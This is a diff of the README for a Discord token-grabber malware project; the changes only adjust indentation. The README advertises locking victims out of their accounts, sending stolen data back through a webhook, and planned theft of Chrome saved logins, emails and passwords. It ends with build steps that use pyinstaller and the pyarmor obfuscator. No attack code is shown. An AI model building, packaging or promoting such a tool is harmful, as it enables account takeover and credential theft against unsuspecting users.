@@ -1,12 +1,11 @@
 # Discordapp TokenGrabber
   - Simple but "advanced" 
-  # 1.0 Deployed!
-   - Changelog:
-    + **New ability: Locks the user completely out of his account**
-    + **New ability: Return data through a webhook**
+     # 1.0 Deployed!
+       + **New ability: Locks the user completely out of his account**
+       + **New ability: Return data through a webhook**
    
-  # Whats next:
-   + **Send all the chrome data (login, email, password) through a webhook too**
+     # Whats next:
+       + **Send all the chrome data (login, email, password) through a webhook too**
 
 # How to compile
  - In CMD: `pip install pyinstaller` & `pip install pyarmor`
